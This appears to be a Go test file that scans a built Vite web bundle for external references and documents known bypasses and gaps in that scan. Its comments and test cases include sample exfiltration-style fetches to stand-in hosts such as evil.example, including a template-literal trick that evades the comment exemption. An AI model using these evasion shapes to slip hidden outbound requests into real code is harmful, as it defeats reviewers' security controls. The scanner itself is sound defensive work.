package board

import (
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// TestDist_NoExternalReferences builds the REAL production dist/ (not a
// fixture, not source) and proves the item constraint — ready.3dl.dev/board
// "must work offline-of-third-parties and under a strict CSP" — holds for
// what actually ships. Before this test the only evidence for "dist/ has
// zero external references" was a human (or agent) reading
// vite.config.ts's comment: a tautology that a future edit could falsify
// silently.
//
// npm ci needs network, so to avoid making every `go test ./...` run a
// network flake we only invoke it once, when web/board/node_modules is
// missing; a repeat run reuses the already-installed tree and only
// re-runs the (local, offline) `npm run build`. If node_modules is absent
// and npm/network is unavailable, this fails loudly with npm's own error —
// it never skips.
//
// The scan reads raw file bytes, not just attribute values (those are
// assertSameOriginAttrs's job below), so a protocol-relative reference
// stuffed into a <style> @import or a JS string literal — e.g.
// fetch("//cdn.jsdelivr.net/x") — is caught even though it never appears as
// a src=/href= attribute. scanExternalRefs defines exactly what counts;
// legalCommentRegionStart defines the one exempt region in .js output.
//
// Stated plainly, because this test is easy to over-trust: it scans source
// text. It cannot see a URL that is assembled at runtime ("http"+"s://x"),
// escaped ("\x68ttps://x"), or read out of data the page loads later. Nor
// can it see one exact scheme-less shape — a dotless host with no path,
// query or fragment, e.g. fetch("//telemetry") — because those bytes are
// also a JavaScript line comment reading "telemetry" and nothing short of
// lexing minified JS tells the two apart (see scanExternalRefs). Add any
// path, or any dot in the host, and it is caught.
//
// What it catches is an external reference written down in the shipped
// bundle — the accidental CDN import, the dependency that inlines a font
// URL, the hand-edited <script src>. Nothing stronger should be claimed
// for it.
func TestDist_NoExternalReferences(t *testing.T) {
	dist := buildDist(t)

	err := filepath.WalkDir(dist, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		switch filepath.Ext(path) {
		case ".html", ".js", ".css":
		default:
			return nil
		}
		b, rerr := os.ReadFile(path)
		if rerr != nil {
			return rerr
		}
		content := string(b)
		for _, ref := range scanExternalRefs(content, exemptRegionStart(path, content)) {
			t.Errorf("%s: %s: ...%s...", path, ref.what, snippet(content, ref.off))
		}
		return nil
	})
	if err != nil {
		t.Fatalf("walk dist: %v", err)
	}

	assertSameOriginAttrs(t, filepath.Join(dist, "index.html"))
}

// TestDist_ExternalRefScanToleratesBannersAndRelayURLs is the other half of
// TestDist_NoExternalReferences: it proves the scan is survivable by things
// that are NOT external references but do contain slashes and URLs.
//
// This is not hypothetical. Until ready-8c5 this scan rejected every "//" in
// the output, so a dependency shipping the near-universal `// @license MIT
// <url>` banner could not be bundled at all, and neither could a wss:// relay
// literal. The board client's response was to hand-roll SHA-256, BIP-340
// schnorr verification and bech32 rather than take a vetted dependency, and
// to move the relay list out of TypeScript into a runtime-fetched JSON file.
// A guard nobody can satisfy does not get satisfied; it gets routed around,
// and here it was routed around straight through the client's security
// boundary. So "a license banner and a wss:// literal build clean" is a
// property worth a test of its own.
//
// It builds testdata/tolerated-refs with the REAL vite.config.ts (not a copy)
// so it also fails if legalComments: "eof" is dropped from that config —
// banners then land inline in the code region and the scan rejects them.
func TestDist_ExternalRefScanToleratesBannersAndRelayURLs(t *testing.T) {
	dist := buildFixture(t, filepath.Join("testdata", "tolerated-refs"))

	bundle, name := readSoleBundle(t, dist)

	// Guard against a vacuous pass: if the fixture stopped carrying these,
	// the test below would "pass" while exercising nothing.
	for _, required := range []string{
		"// @license MIT — https://example.com/l", // preserved dependency banner
		`wss://relay.3dl.network`,                 // relay endpoint literal
	} {
		if !strings.Contains(bundle, required) {
			t.Fatalf("%s: fixture bundle does not contain %q — testdata/tolerated-refs no longer exercises the case this test exists for", name, required)
		}
	}

	for _, ref := range scanExternalRefs(bundle, exemptRegionStart(name, bundle)) {
		t.Errorf("%s: %s: ...%s... — this is a license banner or a relay URL, not an external reference; the scan has been tightened past what a real dependency can ship (see ready-8c5)", name, ref.what, snippet(bundle, ref.off))
	}
}

// externalRef is one reference to a non-same-origin resource found in built
// output.
type externalRef struct {
	off  int    // byte offset of the match within the scanned content
	what string // human-readable classification, for the failure message
}

// urlAuthorityRe matches "//" together with the URL scheme that introduces
// it, if any. The scheme group is optional, so it matches both "https://x"
// (scheme "https") and a protocol-relative "//x" (scheme "").
var urlAuthorityRe = regexp.MustCompile(`(?i)(?:([a-z][a-z0-9+.\-]*):)?//`)

// authorityRe matches a URL authority at the very start of the text that
// follows a "//": optional userinfo ("user@"), then a host — a bracketed IP
// literal ("[::1]", "[2001:db8::1]") or a run of registered-name/IPv4
// characters — then an optional ":port". Group 1 is the host alone, without
// userinfo or port.
//
// It deliberately does NOT require a dot or a TLD. "10.0.0.5", "localhost",
// "telemetry" and "[::1]" are all hosts a browser will happily connect to,
// and every one of them shipped green through a real build while this scan
// insisted on a DNS shape. Whether a match is a violation is decided by
// scanExternalRefs, not here; this regex only says where the authority ends.
//
// " @license MIT", "# sourceMappingURL=x" and "/home/u/x" do not match at
// all — a space, "#" and "/" can begin neither userinfo nor a host.
var authorityRe = regexp.MustCompile(`(?i)^(?:[a-z0-9\-._~%!$&'()*+,;=:]+@)?(\[[0-9a-f:.]+\]|[a-z0-9](?:[a-z0-9\-._~%]*[a-z0-9])?)(?::[0-9]*)?`)

// dnsShapeRe matches a host that is unambiguously a DNS name: at least one
// dot and an alphabetic TLD of two or more characters. "cdn.jsdelivr.net"
// and "fonts.googleapis.com" match; "localhost", "10.0.0.5", "b" and "1.2"
// do not. scanExternalRefs uses it as the second of two independent triggers
// — see there for why a host that is not DNS-shaped still needs a path,
// query or fragment delimiter behind it before it counts.
var dnsShapeRe = regexp.MustCompile(`(?i)^[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}$`)

// allowedSchemes are the schemes whose authority is not treated as an
// external reference. ws:/wss: are here because connecting to nostr relays IS
// the board client's function and every relay is a third-party origin by
// construction — banning wss:// literals does not make the page depend on
// fewer origins, it just moves the relay list somewhere this test cannot see
// (which is exactly what happened before ready-8c5). Which relays are
// trusted is a decision the client makes; it is not a property of the bundle
// text and this scan does not police it.
var allowedSchemes = map[string]bool{"ws": true, "wss": true}

// scanExternalRefs reports every reference to a non-same-origin resource in
// content. Bytes at or after exemptFrom are not scanned (see
// exemptRegionStart); pass len(content) to scan all of it.
//
// A match is a violation when:
//
//   - it carries any scheme other than ws:/wss: — http://, https://, ftp://,
//     anything — regardless of what follows the slashes. This is the same
//     strength the http(s) scan has always had: "https://localhost:8080/x"
//     and "https://10.0.0.5/x" are violations even though neither has a
//     DNS-shaped host.
//   - it carries no scheme AND is followed by something authority-shaped
//     (authorityRe) that is EITHER terminated by a path, query or fragment
//     delimiter — "//10.0.0.5/beacon.json", "//localhost:8080/x",
//     "//telemetry/x", "//[::1]/x", "//user@evil.example/x" — OR whose host
//     is DNS-shaped, which needs no delimiter: "//cdn.jsdelivr.net" and
//     "@import url(//fonts.googleapis.com/x)" both count.
//
// Neither scheme-less trigger subsumes the other, and both are needed. The
// delimiter alone would miss "//evil.example" with no path. The DNS shape
// alone is what this scan required for one round of ready-8c5, and it let
// every dotless and every numeric host through: an IPv4 quad, a bracketed
// IPv6 literal, a single-label intranet name, a host hidden behind userinfo,
// a host:port. Every one of them shipped green through a real build. A host
// does not have to look like a DNS name to be a third-party origin.
//
// The delimiter requirement — rather than treating any authority-shaped run
// as a reference — is what keeps "//" usable as punctuation. "//" is also
// the JavaScript line-comment token and the tail of every absolute URL, so
// the string "a//b" and the comment "//a" both put host-legal characters
// right after two slashes. Requiring a "/", "?" or "#" behind an
// undistinguished host separates "//telemetry/beacon.json" from "a//b"
// without going back to rejecting the token itself, which is what banned
// license banners and wss:// literals from the bundle before ready-8c5.
//
// Consequences worth naming. Two are false POSITIVES:
//
//   - A URL written inside a line comment in the CODE region (not the
//     trailing banner region) still fails, e.g. a source comment reading
//     "//github.com/foo/bar".
//   - So does a string that merely looks like one, e.g. "a//b/c".
//
// Both are left in because the alternative — deciding comment-ness and
// string-ness by lexing minified JavaScript — fails in the direction of a
// false PASS. Rewording a comment is cheaper than a missed CDN reference.
// (A third false positive belongs to the exemption rather than to this
// predicate: a preserved banner carrying a quote character loses its
// exemption. See legalCommentRegionStart.)
//
// One is a false NEGATIVE, and it is the exact residue of the two triggers
// above: a scheme-less reference to a dotless host with no path, query or
// fragment — fetch("//telemetry"), fetch("//localhost") — is NOT reported.
// It fires neither trigger, and it cannot: those same bytes are also a
// JavaScript line comment whose text is the single word "telemetry", which
// is what "//a" in real minified output usually is. Nothing distinguishes
// them without lexing. The hole is narrow — one dot in the host or one "/"
// after it closes it — and closing it by hand would mean rejecting every
// one-word line comment in the bundle.
func scanExternalRefs(content string, exemptFrom int) []externalRef {
	var refs []externalRef
	for _, m := range urlAuthorityRe.FindAllStringSubmatchIndex(content, -1) {
		off := m[0]
		if off >= exemptFrom {
			continue
		}
		scheme := ""
		if m[2] != -1 {
			scheme = strings.ToLower(content[m[2]:m[3]])
		}
		rest := content[m[1]:]
		switch {
		case scheme == "":
			a := authorityRe.FindStringSubmatchIndex(rest)
			if a == nil {
				continue
			}
			authority, host := rest[a[0]:a[1]], rest[a[2]:a[3]]
			if !endsAuthority(rest[a[1]:]) && !dnsShapeRe.MatchString(host) {
				continue
			}
			refs = append(refs, externalRef{off: off, what: fmt.Sprintf("protocol-relative reference to //%s", authority)})
		case allowedSchemes[scheme]:
			continue
		default:
			refs = append(refs, externalRef{off: off, what: fmt.Sprintf("absolute %s:// URL", scheme)})
		}
	}
	return refs
}

// endsAuthority reports whether rest — the text immediately after an
// authority — begins with a character that can only be the start of a URL
// path, query or fragment. Per RFC 3986 those three are the sole ways an
// authority component may end other than at the end of the URL; a URL's end
// is not detectable here, because in built output a URL is embedded in
// JavaScript or CSS and its "end" is whatever quote, paren or semicolon the
// surrounding syntax happens to use.
func endsAuthority(rest string) bool {
	return strings.HasPrefix(rest, "/") || strings.HasPrefix(rest, "?") || strings.HasPrefix(rest, "#")
}

// exemptRegionStart returns the offset in content from which scanExternalRefs
// should stop looking. For .js output that is the start of the trailing
// comment run (legalCommentRegionStart); for .html and .css it is len(content)
// — every byte is scanned. Today that costs nothing: the page's CSS is inline
// in index.html and dist/ emits no .css chunk, so no HTML or CSS we ship
// carries a preserved banner. The day a CSS dependency with a `/*! ... */`
// banner is bundled, this scan will reject it and this function is where to
// extend the exemption — it fails in the direction of a broken build, not a
// missed reference.
func exemptRegionStart(path, content string) int {
	if filepath.Ext(path) == ".js" {
		return legalCommentRegionStart(content)
	}
	return len(content)
}

// legalCommentRegionStart returns the offset at which js's trailing run of
// pure comments begins, or len(js) when the file does not end in one. A
// position qualifies when all three hold, and the earliest qualifying
// position wins:
//
//   - it is the start of a line, or of the file;
//   - everything from there to EOF is nothing but whitespace, "//" line
//     comments and "/* */" block comments (isOnlyCommentsAndSpace);
//   - no backtick, double quote or single quote appears at or after it.
//
// That region is where esbuild puts the license banners it is obliged to
// preserve, because vite.config.ts sets legalComments: "eof". Nothing in a
// run of comments executes and nothing in it can be fetched, so a URL there
// is not an external reference. Drop legalComments: "eof" and banners land
// inline in the code instead — no trailing run, no exemption, and
// TestDist_ExternalRefScanToleratesBannersAndRelayURLs fails.
//
// WHY THE QUOTE CONDITION. The first two alone are not enough, and the gap was
// not hypothetical — appending this to src/main.ts built green through
// `npm run build` and `go test ./...`:
//
//	void fetch(`
//	//evil.example/beacon.json`);
//
// esbuild copies a template literal's newlines into the emitted chunk
// verbatim, so the chunk's last line became "//evil.example/beacon.json`);" —
// a line start whose remainder is a "//" run to EOF. isOnlyCommentsAndSpace
// read those bytes as a comment and the exemption swallowed the closing
// backtick and paren along with them. They are string data, and a browser
// resolves them: new URL("\n//evil.example/beacon.json",
// "https://ready.3dl.dev/board/") is https://evil.example/beacon.json. Two
// siblings shipped green the same way — the payload line followed by a real
// preserved banner (so the exempt run is not the final line), and a payload
// line led by a "/*! */" comment.
//
// The condition that closes the class: a raw newline can reach a JavaScript
// expression in exactly two ways — inside a template literal, or inside a
// string literal continued by a trailing backslash — and either way the
// literal must be closed by its delimiter (`, " or ') before the file ends.
// If a candidate region begins inside such a literal, that closing delimiter
// necessarily lies inside the region, at or after the injected bytes. A region
// containing no quote character therefore cannot be the interior of a literal,
// and the comment reading is the only reading left. A literal left
// unterminated at EOF evades the condition but not the consequence: the chunk
// then fails to parse, so nothing in it runs and nothing is fetched.
//
// WHAT THE CONDITION COSTS. A preserved banner that contains a quote character
// forfeits the exemption for the whole trailing run, so any URL in that banner
// is reported. The realistic case is a full Apache-2.0 header, which carries
// both a license URL and the words "AS IS" in quotes after it. That is a loud
// build break naming the file and offset, not a silent pass, and
// TestExternalRefScan_Predicate pins it as a KNOWN COST row so it is found
// here rather than in CI. The alternative — deciding comment-ness by lexing
// minified JavaScript — fails the other way, because mistaking a string for a
// comment silently hides whatever follows it on the line.
func legalCommentRegionStart(js string) int {
	// A qualifying position must start after the last quote character in the
	// file; scanning backwards once is equivalent to testing every candidate
	// and cheaper.
	afterQuotes := strings.LastIndexAny(js, "`\"'") + 1
	for i := 0; ; {
		if i >= afterQuotes && isOnlyCommentsAndSpace(js[i:]) {
			return i
		}
		nl := strings.IndexByte(js[i:], '\n')
		if nl == -1 {
			return len(js)
		}
		i += nl + 1
	}
}

// isOnlyCommentsAndSpace reports whether s, read as JavaScript starting in
// code position, consists of nothing but whitespace and complete comments.
// An unterminated /* block comment is not "complete" and returns false; an
// unterminated // line comment at EOF is.
//
// "Starting in code position" is a precondition, not something this function
// checks: handed the interior of a string or template literal it will happily
// report that attacker-supplied bytes are a comment run. Establishing the
// precondition is legalCommentRegionStart's job — see the quote condition
// there — so do not call this from anywhere else without doing the same.
func isOnlyCommentsAndSpace(s string) bool {
	for {
		s = strings.TrimLeft(s, " \t\r\n")
		switch {
		case s == "":
			return true
		case strings.HasPrefix(s, "//"):
			nl := strings.IndexByte(s, '\n')
			if nl == -1 {
				return true
			}
			s = s[nl+1:]
		case strings.HasPrefix(s, "/*"):
			end := strings.Index(s[2:], "*/")
			if end == -1 {
				return false
			}
			s = s[2+end+2:]
		default:
			return false
		}
	}
}

// TestExternalRefScan_Predicate pins the predicate itself, both directions,
// without paying for a build. The dist-level tests prove the wiring (the scan
// runs over what actually ships, and real Vite output survives it); this
// proves the classification, including the cases a build fixture cannot
// conveniently produce — an IP-literal https URL, an inline banner, a
// trailing comment run that must not swallow code above it.
func TestExternalRefScan_Predicate(t *testing.T) {
	for _, tc := range []struct {
		name    string
		path    string
		content string
		want    int
	}{
		// --- must be rejected -------------------------------------------
		{"protocol-relative fetch in a JS string", "chunk.js",
			`function t(){fetch("//cdn.jsdelivr.net/npm/telemetry@1/beacon.json")}`, 1},
		{"protocol-relative CSS @import", "index.html",
			`<style>@import url(//fonts.googleapis.com/css2?family=Inter);</style>`, 1},
		{"protocol-relative with leading space inside the string", "chunk.js",
			`fetch(" //evil.example/x")`, 1},
		{"absolute https in a script tag", "index.html",
			`<script src="https://cdn.example.com/x.js"></script>`, 1},
		{"absolute https to a host with no dot", "chunk.js",
			`fetch("https://localhost:8080/x")`, 1},
		{"absolute https to an IP literal", "chunk.js",
			`fetch("https://10.0.0.5/x")`, 1},
		{"absolute http in a CSS url()", "sheet.css",
			`body{background:url("http://x.example/a.png")}`, 1},
		{"a scheme that is neither http nor ws", "chunk.js",
			`const u="ftp://files.example.com/x"`, 1},
		{"license banner left INLINE instead of at EOF", "chunk.js",
			"const a=1;// @license MIT — https://example.com/l\nconst b=2;\n", 1},
		{"trailing comment run does not exempt code above it", "chunk.js",
			"//a\nconst z=fetch(\"//evil.example/x\");\n//b\n", 1},
		{"unterminated block comment is not a comment run", "chunk.js",
			"const a=1;\n/* https://evil.example/x\n", 1},
		{"trailing comment exemption is JS-only", "index.html",
			"<p>hi</p>\n// https://evil.example/x\n", 1},
		{"every violation is reported, not just the first", "chunk.js",
			`fetch("https://a.example/x");fetch("//b.example/y")`, 2},

		// A scheme-less reference does not need a DNS-shaped host to reach a
		// third party. Every row below shipped GREEN through a real build
		// while this scan required a dot and an alphabetic TLD; each is a
		// live egress to an origin the page does not control.
		{"protocol-relative to an IPv4 literal", "chunk.js",
			`fetch("//10.0.0.5/beacon.json")`, 1},
		{"protocol-relative to a bracketed IPv6 literal", "chunk.js",
			`fetch("//[2001:db8::1]/beacon.json")`, 1},
		{"protocol-relative to loopback IPv6", "chunk.js",
			`fetch("//[::1]/x")`, 1},
		{"protocol-relative to a host with a port and no dot", "chunk.js",
			`const u="//localhost:8080/x"`, 1},
		{"protocol-relative to a single-label host", "chunk.js",
			`const u="//telemetry/beacon.json"`, 1},
		{"protocol-relative carrying userinfo", "chunk.js",
			`const u="//user@evil.example/x"`, 1},
		{"protocol-relative to an IPv4 literal in an inline style", "index.html",
			`<style>body{background:url(//10.0.0.5/a.png)}</style>`, 1},
		{"protocol-relative to an IPv4 literal with a port", "chunk.js",
			`fetch("//10.0.0.5:9000/x")`, 1},
		{"protocol-relative with a query and no path", "chunk.js",
			`fetch("//telemetry?id=1")`, 1},
		// The DNS-shape trigger has to survive on its own: a bare origin has
		// no path, query or fragment to terminate its authority, so the
		// delimiter rule alone would let this through.
		{"protocol-relative to a bare DNS origin with no path at all", "chunk.js",
			`fetch("//evil.example")`, 1},

		// A newline inside a template literal puts attacker-controlled bytes
		// at the start of a line, where they read as a comment run to EOF and
		// the trailing-banner exemption used to swallow them — closing
		// backtick, paren and all. All three rows below built GREEN through a
		// real `npm run build`; the first is a live fetch of
		// https://evil.example/beacon.json once the browser resolves the
		// literal against the page URL. legalCommentRegionStart's quote
		// condition is what rejects them.
		{"payload at a line start inside a template literal", "chunk.js",
			"d();fetch(`\n//evil.example/beacon.json`);\n", 1},
		{"same payload, with a real preserved banner after it", "chunk.js",
			"d();fetch(`\n//evil.example/beacon.json`);\n// @license MIT — https://example.com/l\n", 1},
		{"payload line led by a legal block comment", "chunk.js",
			"d();fetch(`\n/*!x*/ //evil.example/beacon.json`);\n", 1},
		// esbuild folds a backslash-continued string onto one line, so this
		// shape does not survive today's build. It is pinned because the
		// exemption must not depend on that: a bundler that preserved the
		// continuation would reproduce the template-literal bypass exactly.
		{"payload at a line start inside a backslash-continued string", "chunk.js",
			"d();fetch(\"\\\n//evil.example/beacon.json\");\n", 1},

		// --- must be accepted -------------------------------------------
		{"preserved license banner at EOF", "chunk.js",
			"const a=1;\n// @license MIT — https://example.com/l\n", 0},
		{"preserved multi-line block banner at EOF", "chunk.js",
			"const a=1;\n/*! pako 2.1.0\n * https://github.com/nodeca/pako\n */\n", 0},
		{"relay endpoint literals in code", "chunk.js",
			`const R=["wss://relay.3dl.network","ws://127.0.0.1:7777"];`, 0},
		{"the line-comment token on its own", "chunk.js",
			"// this comment is not a reference\nconst a=1;\n", 0},
		{"source map comment", "chunk.js",
			"const a=1;\n//# sourceMappingURL=index.js.map\n", 0},
		{"root-relative asset path", "index.html",
			`<script type="module" src="/board/assets/index-abc.js"></script>`, 0},
		{"doubled slash with no host after it", "chunk.js",
			`const p="a//b",q="x//1.2"`, 0},

		// --- known false negative, pinned so it stays visible -------------
		//
		// This row is NOT a property worth having. It records the one shape
		// the scan provably cannot see (scanExternalRefs says why): the bytes
		// are equally a fetch to a dotless intranet host and a line comment
		// reading "telemetry". If a future change closes this, that is an
		// improvement — delete the row, do not weaken the change to keep it.
		{"KNOWN GAP: dotless host with no path is indistinguishable from a one-word line comment", "chunk.js",
			`fetch("//telemetry")`, 0},

		// --- known cost, pinned so it stays visible -----------------------
		//
		// Also NOT a property worth having: the price of the quote condition
		// in legalCommentRegionStart. A quote character anywhere in the
		// trailing comment run forfeits the exemption for the whole run, and a
		// full Apache-2.0 header has both a license URL and "AS IS" after it,
		// so this reports 1 where the banner is genuinely inert. The board
		// ships no runtime dependencies today; if one ever lands a banner like
		// this the build breaks loudly here rather than passing silently. A
		// change that keeps every literal-interior row above red while making
		// this row 0 is strictly better — delete the row, do not weaken the
		// change to keep it.
		{"KNOWN COST: a quote after a URL in a preserved banner forfeits its exemption", "chunk.js",
			"const a=1;\n/*! Licensed under the Apache License, Version 2.0\n * http://www.apache.org/licenses/LICENSE-2.0\n * distributed on an \"AS IS\" BASIS\n */\n", 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := scanExternalRefs(tc.content, exemptRegionStart(tc.path, tc.content))
			if len(got) != tc.want {
				t.Fatalf("scanExternalRefs(%q) found %d references, want %d: %v", tc.content, len(got), tc.want, got)
			}
		})
	}
}

// TestDist_BuildStampReachesBundle proves the VITE_BUILD_STAMP value main.ts
// receives at build time actually survives into the RENDERED output — the
// orchestrator's post-merge verification (curl the deployed page, look for
// the just-built commit SHA in what a browser would display) depends on
// this. Two things are checked, both required:
//
//  1. The literal stamp value is embedded in the bundle at all (guards
//     against the env var never reaching the build — wrong name, Vite
//     define misconfiguration, etc).
//  2. It is embedded via the interpolation main.ts actually uses to render
//     it: “ `build:${STAMP}` “ (tsc/esbuild preserve template-literal
//     syntax through minification, only renaming the identifier). This
//     second check is why checking (1) alone is not enough: a mutation
//     that keeps `const BUILD_STAMP = ...` referenced somewhere (so tsc's
//     noUnusedLocals stays quiet) but hardcodes the rendered textContent to
//     a literal string (e.g. "build:redacted") still embeds the stamp
//     value in the bundle as an unused constant and would pass check (1)
//     alone while the deployed page shows nothing useful. Check (2) fails
//     in that case because the "build:${" interpolation prefix is gone.
func TestDist_BuildStampReachesBundle(t *testing.T) {
	dist := buildDist(t)
	assetsDir := filepath.Join(dist, "assets")
	entries, err := os.ReadDir(assetsDir)
	if err != nil {
		t.Fatalf("read %s: %v", assetsDir, err)
	}
	var sawStamp, sawInterpolation bool
	for _, e := range entries {
		if e.IsDir() || filepath.Ext(e.Name()) != ".js" {
			continue
		}
		b, rerr := os.ReadFile(filepath.Join(assetsDir, e.Name()))
		if rerr != nil {
			t.Fatalf("read %s: %v", e.Name(), rerr)
		}
		content := string(b)
		if strings.Contains(content, buildStampForTest) {
			sawStamp = true
		}
		if strings.Contains(content, "build:${") {
			sawInterpolation = true
		}
	}
	if !sawStamp {
		t.Fatalf("build stamp %q not found in any dist/assets/*.js — VITE_BUILD_STAMP is not reaching the shipped bundle", buildStampForTest)
	}
	if !sawInterpolation {
		t.Fatalf(`no "build:${...}" interpolation found in any dist/assets/*.js — the stamp value is present in the bundle but nothing renders it into the page`)
	}
}

// assertSameOriginAttrs proves every <script src="..."> / <link href="...">
// in the built HTML resolves same-origin: either root-relative
// ("/board/...", required by vite.config.ts's base: "/board/" so assets
// resolve correctly when the page is mounted under a sub-path) or
// document-relative ("./x", "x"). None may carry a scheme or be
// protocol-relative ("//host/x") — that would be a CDN or other
// third-party origin, exactly what this item forbids. A root-relative
// target must also actually start with "/board/" — vite.config.ts's
// base: "/board/" is what makes that true; if base is ever removed or
// changed, built asset URLs go root-relative-but-wrong (e.g.
// "/assets/x.js") and 404 the instant the page is served under
// ready.3dl.dev/board/, even though they're still same-origin and would
// have passed the check above.
func assertSameOriginAttrs(t *testing.T, htmlPath string) {
	t.Helper()
	b, err := os.ReadFile(htmlPath)
	if err != nil {
		t.Fatalf("read %s: %v", htmlPath, err)
	}
	html := string(b)
	for _, attr := range []string{`src="`, `href="`} {
		start := 0
		for {
			idx := strings.Index(html[start:], attr)
			if idx == -1 {
				break
			}
			valueStart := start + idx + len(attr)
			valueEnd := strings.Index(html[valueStart:], `"`)
			if valueEnd == -1 {
				break
			}
			target := html[valueStart : valueStart+valueEnd]
			if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") || strings.HasPrefix(target, "//") {
				t.Errorf("%s: attribute target %q is not same-origin", htmlPath, target)
			} else if strings.HasPrefix(target, "/") && !strings.HasPrefix(target, "/board/") {
				t.Errorf("%s: attribute target %q is root-relative but does not start with /board/ (vite.config.ts base) — assets will 404 when mounted under a sub-path", htmlPath, target)
			}
			start = valueStart + valueEnd
		}
	}
}

func snippet(s string, idx int) string {
	start := idx - 30
	if start < 0 {
		start = 0
	}
	end := idx + 30
	if end > len(s) {
		end = len(s)
	}
	return s[start:end]
}

// buildStampForTest is the VITE_BUILD_STAMP value buildDist injects. It is
// a package const (not inlined at each call site) so
// TestDist_BuildStampReachesBundle checks for the exact value buildDist
// actually set, rather than a second hard-coded copy that could drift.
const buildStampForTest = "go-test"

func buildDist(t *testing.T) string {
	t.Helper()
	ensureNodeModules(t)
	cmd := exec.Command("npm", "run", "build")
	cmd.Env = append(os.Environ(), "VITE_BUILD_STAMP="+buildStampForTest)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("npm run build: %v\n%s", err, out)
	}
	return "dist"
}

// buildFixture builds a small Vite project rooted at root (a testdata
// directory) into a temp dir and returns that dir. It runs the project's own
// vite.config.ts on purpose: a fixture built with a copied config would keep
// passing after the real config changed, which is the whole property
// TestDist_ExternalRefScanToleratesBannersAndRelayURLs is checking.
func buildFixture(t *testing.T, root string) string {
	t.Helper()
	ensureNodeModules(t)
	outDir := t.TempDir()
	vite := filepath.Join("node_modules", ".bin", "vite")
	// --emptyOutDir: outDir is outside the project root, where Vite otherwise
	// refuses to clear it without confirmation.
	cmd := exec.Command(vite, "build", "--config", "vite.config.ts", "--emptyOutDir", "--outDir", outDir, root)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("vite build %s: %v\n%s", root, err, out)
	}
	return outDir
}

// readSoleBundle returns the contents and path of the single JavaScript chunk
// under dist/assets. It fails rather than picking one if there are several,
// so a caller can never end up asserting against whichever chunk happened to
// sort first.
func readSoleBundle(t *testing.T, dist string) (string, string) {
	t.Helper()
	matches, err := filepath.Glob(filepath.Join(dist, "assets", "*.js"))
	if err != nil {
		t.Fatalf("glob %s: %v", dist, err)
	}
	if len(matches) != 1 {
		t.Fatalf("expected exactly one .js chunk in %s/assets, found %d: %v", dist, len(matches), matches)
	}
	b, err := os.ReadFile(matches[0])
	if err != nil {
		t.Fatalf("read %s: %v", matches[0], err)
	}
	return string(b), matches[0]
}

func ensureNodeModules(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("npm"); err != nil {
		t.Fatalf("npm not found on PATH — required to build the board dist under test: %v", err)
	}
	if _, statErr := os.Stat("node_modules"); statErr != nil {
		cmd := exec.Command("npm", "ci")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("npm ci: %v\n%s", err, out)
		}
	}
}
